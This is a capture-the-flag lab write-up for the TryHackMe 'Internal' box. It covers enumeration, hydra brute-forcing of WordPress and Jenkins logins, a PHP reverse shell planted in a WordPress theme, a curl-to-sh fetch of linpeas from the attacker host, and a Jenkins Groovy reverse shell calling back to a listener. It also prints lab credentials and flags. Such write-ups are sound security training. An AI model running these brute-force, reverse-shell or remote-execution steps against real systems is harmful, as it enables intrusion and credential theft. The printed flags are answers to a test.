# Internal

LHOST 10.8.127.74
RHOST 10.10.76.214, 10.10.30.157


## Config

We need to change the content of /etc/hosts

```
10.10.76.214	internal.thm
```

## Enumeration

### nmap

```
root@ST:/home/thm/cc_pentest/ctf# nmap -sC -sV 10.10.76.214
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-28 13:25 UTC
Nmap scan report for 10.10.76.214
Host is up (0.075s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.64 seconds
```

### gobuster

```
root@ST:/home/thm/cc_pentest/ctf# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.76.214
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.76.214
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/28 13:29:17 Starting gobuster
===============================================================
/blog (Status: 301)
/index.php (Status: 301)
/blog/license.txt (Status: 200)
/blog/wp-admin (Status: 301)
/blog/wp-content (Status: 301)
/blog/wp-includes (Status: 301)
/wordpress (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================================================
2021/09/28 13:57:24 Finished
===============================================================
```

## Server fingerprint

```
<meta name="generator" content="WordPress 5.4.2" />
```

## XSS

Comment are vulnerable to xss

## SQLi

```
root@ST:/home/thm/cc_pentest/ctf# sqlmap -u http://internal.thm/blog/?s=test -p s
```

param s doesn't seem to be injectable

## Hydra

`Error: The password you entered for the username admin is incorrect` this message show that the user admin exist, we are going to try to bruteforce it with hydra

```
root@ST:/# hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect" -V
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-28 14:52:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://internal.thm:80/blog/wp-login.php::log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect
[ATTEMPT] target internal.thm - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
...
9 [child 15] (0/0)
[ATTEMPT] target internal.thm - login "admin" - pass "changeme" - 3904 of 14344399 [child 7] (0/0)
[ATTEMPT] target internal.thm - login "admin" - pass "zamora" - 3905 of 14344399 [child 13] (0/0)
[80][http-post-form] host: internal.thm   login: admin   password: my2boys
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-28 14:56:11
9 [child 15] (0/0)
[ATTEMPT] target internal.thm - login "admin" - pass "changeme" - 3904 of 14344399 [child 7] (0/0)
[ATTEMPT] target internal.thm - login "admin" - pass "zamora" - 3905 of 14344399 [child 13] (0/0)
[80][http-post-form] host: internal.thm   login: admin   password: my2boys
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-28 14:56:11
```

we were able to successefully find the password 

`admin:my2boys`

when we login, we have the will credential as a private note

`william:arnold147`

## Reverse Shell

I got a shell by changing theme code in wordpress with `php-reverse-shell.php`

```
root@ST:/home/thm/cc_pentest/ctf# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.8.127.74] from (UNKNOWN) [10.10.76.214] 35260
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:34:46 up  2:11,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

changing user to william didn't work 

```
$ su
su: must be run from a terminal
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su william
su william
No passwd entry for user 'william'
``` 

## Linpeas

```
$ curl 10.8.127.74:8000/linpeas.sh | sh
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.21p2

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:46537         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 10.10.76.214:53428      10.8.127.74:8000        CLOSE_WAIT  3777/curl
tcp        0   7556 10.10.76.214:35262      10.8.127.74:1337        ESTABLISHED 3633/sh
tcp        0      0 10.10.76.214:35260      10.8.127.74:1337        CLOSE_WAIT  3533/sh
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       1      0 10.10.76.214:80         10.8.127.74:55852       CLOSE_WAIT  -
tcp6       0      0 10.10.76.214:80         10.8.127.74:55876       ESTABLISHED -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 10.10.76.214:68         0.0.0.0:*

[+] Searching Wordpress wp-config.php files
wp-config.php files found:
/var/www/html/wordpress/wp-config.phpdefine( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress123' );
define( 'DB_HOST', 'localhost' );

[+] SGID
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
```

Nothing important in phpmyadmin

After manual enumeration, aubreanna was stored in /opt/wp-save.txt

```
aubreanna:bubb13guM!@#123
```

after connecting we find the first flag and jenkins.txt

```
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
```

```
Internal Jenkins service is running on 172.17.0.2:8080
```

SSH port forwarding to access to server jenkins

```
root@ST:/home/thm# ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.30.157
```

IP docker0 : 172.17.0.1

## bruteforce

burteforcing jenkins using hydra 

```
root@ST:/home/thm/cc_pentest/ctf# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 localhost http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Submit=Sign in:F=Invalid" -V
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-28 17:12:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://localhost:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Submit=Sign in:F=Invalid
[ATTEMPT] target localhost - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
...
[ATTEMPT] target localhost - login "admin" - pass "love123" - 332 of 14344399 [child 4] (0/0)
[8080][http-post-form] host: localhost   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-28 17:13:34
```

we have found the password of jenkins admin:spongebob

running reverse shell

```
String host="172.17.0.1";
int port=1337;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

aubreanna@internal:~$ nc -nlvp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from 172.17.0.2 59756 received!
$ whoami
jenkins
$ cd /opt
$ cat note.txt
root:tr0ub13guM!@#123
```

then we connect with root credential to get the seconde flag root.txt

```
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}

```
